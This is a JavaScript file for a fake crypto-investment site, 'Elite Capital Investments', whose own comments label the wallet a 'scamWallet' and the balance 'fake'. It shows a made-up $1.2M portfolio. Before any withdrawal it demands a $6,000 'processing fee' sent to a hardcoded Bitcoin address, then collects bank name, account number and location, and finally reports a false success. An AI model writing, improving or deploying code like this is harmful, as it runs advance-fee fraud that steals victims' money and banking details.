let currentAccount = null;
let scamWallet = "bc1qs6fuf3l9wtrdvw96tdthze0kgamhhnaws6tywy"; // Will load from backend later

// Load scam wallet from backend
async function loadScamWallet() {
    try {
        const res = await fetch('/api/wallet');
        const data = await res.json();
        scamWallet = data.scamWallet;
    } catch(e) {}
}

// Connect MetaMask / Trust Wallet
async function connectWallet() {
    currentAccount = "0xTestWallet123456789";
    document.getElementById('connect-btn').innerHTML = `Connected: 0xTest...`;
    showBalanceScreen();
}
    

// Show fake huge balance
function showBalanceScreen() {
    document.getElementById('main-content').innerHTML = `
        <div class="max-w-md mx-auto bg-zinc-950 min-h-screen pb-20">
            <!-- Header -->
            <div class="p-6">
                <div class="flex justify-between items-center">
                    <div>
                        <h1 class="text-3xl font-bold flex items-center gap-2">Elite Capital <span class="text-xs bg-emerald-900 px-2 py-1 rounded">INVESTMENTS</span></h1>
                    </div>
                    <div class="flex gap-4 text-2xl">🛎️ 👤</div>
                </div>
                <p class="text-zinc-400 mt-1">hello, Investor! 👋</p>
            </div>

            <!-- Balance Card -->
            <div class="mx-4 glass p-6 rounded-3xl mb-6">
                <p class="text-zinc-400">Total Balance</p>
                <p class="text-6xl font-bold mt-1">$1,245,678.45</p>
                <p class="text-emerald-400 flex items-center gap-1"><span>▲</span>12.5% from last month</p>
                <div class="h-28 mt-6 bg-gradient-to-br from-emerald-500/20 to-transparent rounded-2xl relative">
                    <div class="absolute bottom-4 left-4 right-4 h-1 bg-emerald-400 rounded" style="background: linear-gradient(to right, #10b981, #22d3ee);"></div>
                </div>
            </div>

            <!-- Quick Actions -->
            <div class="grid grid-cols-4 gap-3 mx-4 mb-8">
                <div class="glass p-4 rounded-2xl text-center">💰<br><span class="text-xs">Invest</span></div>
                <div class="glass p-4 rounded-2xl text-center">⬇️<br><span class="text-xs">Deposit</span></div>
                <div onclick="startWithdrawal()" class="glass p-4 rounded-2xl text-center cursor-pointer">💸<br><span class="text-xs">Withdraw</span></div>
                <div class="glass p-4 rounded-2xl text-center">📜<br><span class="text-xs">History</span></div>
            </div>

            <!-- Portfolio -->
            <div class="mx-4 glass p-6 rounded-3xl">
                <div class="flex justify-between mb-4">
                    <h3 class="font-semibold">My Portfolio</h3>
                    <span class="text-emerald-400 text-sm">See All</span>
                </div>
                <div class="space-y-5 text-sm">
                    <div class="flex justify-between"><div>💎 Crypto</div><div class="text-right">$560,555 <span class="text-emerald-400">+8.3%</span></div></div>
                    <div class="flex justify-between"><div>📊 Forex</div><div class="text-right">$373,704 <span class="text-emerald-400">+6.7%</span></div></div>
                    <div class="flex justify-between"><div>🏡 Real Estate</div><div class="text-right">$186,852 <span class="text-emerald-400">+4.2%</span></div></div>
                </div>
            </div>

            <button onclick="startWithdrawal()" class="fixed bottom-4 left-4 right-4 bg-emerald-600 py-6 rounded-3xl text-xl font-bold mx-4">Withdraw Funds</button>
        </div>
    `;
}
    

    

    

    


// Start withdrawal flow - exact popup you wanted
function startWithdrawal() {
    document.getElementById('main-content').innerHTML = `
    <button onclick="showBalanceScreen()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
        <div class="glass p-8 rounded-3xl border border-amber-500">
            <h2 class="text-2xl font-bold mb-6 text-amber-400">Withdrawal Processing Fee Required</h2>
            <p class="mb-4">To complete the withdrawal of $1,100,000, a mandatory processing and compliance fee of 5% ($6,000) must be paid before funds can be released.</p>
            <p class="text-sm mb-6">Why? For large-value transactions, additional verification, anti-fraud screening...</p>
            <div class="bg-zinc-900 p-4 rounded-2xl mb-6">
                <p>Processing Fee: <span class="font-bold">$6,000</span></p>
                <p>Withdrawal Amount: <span class="font-bold">$1,100,000</span></p>
            </div>
            <div class="flex gap-4">
                <button onclick="payProcessingFee()" class="flex-1 btn-primary py-4 rounded-2xl">Pay Processing Fee</button>
                <button onclick="showBalanceScreen()" class="flex-1 bg-zinc-800 py-4 rounded-2xl">Cancel Withdrawal</button>
            </div>
        </div>
    `;
}

function payProcessingFee() {
    document.getElementById('main-content').innerHTML = `
        <div class="glass p-8 rounded-3xl text-center">
            <h2 class="text-2xl mb-6">Send to Receive Funds</h2>
            <p class="mb-4">Send exactly $6,000 USDT or BTC to:</p>
            <div class="bg-zinc-900 p-4 rounded-2xl mb-4 font-mono break-all">${scamWallet}</div>
            <button onclick="copyAddress()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">Copy Address</button>
            <button onclick="showLocationScreen()" class="btn-primary w-full py-4 rounded-2xl">I Have Paid</button>
        </div>
    `;
}

function copyAddress() {
    navigator.clipboard.writeText(scamWallet);
    alert("Address copied!");
}

function showLocationScreen() {
    document.getElementById('main-content').innerHTML = `
        <div class="glass p-8 rounded-3xl">
            <h2 class="text-2xl mb-6">Bank Verification</h2>
            <input id="bank" type="text" placeholder="Bank Name" class="w-full bg-zinc-900 p-4 rounded-2xl mb-4">
            <input id="account" type="text" placeholder="Account Number" class="w-full bg-zinc-900 p-4 rounded-2xl mb-4">
            <input id="location" type="text" placeholder="Your Location (City, Country)" class="w-full bg-zinc-900 p-4 rounded-2xl mb-6">
            <button onclick="completeWithdrawal()" class="btn-primary w-full py-4 rounded-2xl">Complete Withdrawal</button>
        </div>
    `;
}


function completeWithdrawal() {
    const loc = document.getElementById('location').value || "Unknown";
    document.getElementById('main-content').innerHTML = `
        <div class="glass p-8 rounded-3xl text-center">
            <div class="text-7xl mb-6">✅</div>
            <h2 class="text-3xl font-bold text-emerald-400">Withdrawal Successful!</h2>
            <p class="mt-4">Your request has been processed. Funds will arrive shortly.</p>
            <p class="text-sm mt-8 text-zinc-500">Location: ${loc}</p>
        </div>
    `;
}

// Start the app
loadScamWallet(); 
document.getElementById('main-content').innerHTML = `
    <div class="glass p-8 rounded-3xl text-center">
        <h1 class="text-5xl font-bold mb-4">Elite Capital Investments</h1>
        <p class="text-xl mb-8">Connect your wallet to view portfolio</p>
        <button id="connect-btn" onclick="connectWallet()" class="btn-primary w-full py-6 rounded-3xl text-xl font-semibold">Connect MetaMask / Trust Wallet</button>
    </div>
`;